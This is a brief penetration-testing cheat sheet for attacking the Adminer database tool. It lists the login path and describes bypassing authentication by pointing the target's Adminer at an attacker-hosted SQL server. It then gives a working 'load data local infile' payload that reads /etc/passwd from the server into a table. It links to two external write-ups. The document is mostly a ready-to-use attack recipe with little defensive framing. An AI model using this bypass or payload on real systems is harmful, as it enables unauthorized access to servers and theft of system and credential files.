# adminer.php

## Login Page

```bash
/adminer.php
```

## Interesting Paths

```bash
/var/www/html/index.php
```

## Auth Bypass and LFI

Host own SQL server, connect via target to bypass login

[link1](https://infosecwriteups.com/adminer-script-results-to-pwning-server-private-bug-bounty-program-fe6d8a43fe6f)| [link2](https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool)

```bash
Check PHPinfo
open_basedir /var/www/html => can only read files in this dir.

# LFI via SQL

load data local infile "/etc/passwd"
into table admirer.pwn
fields terminated by "\n";
```

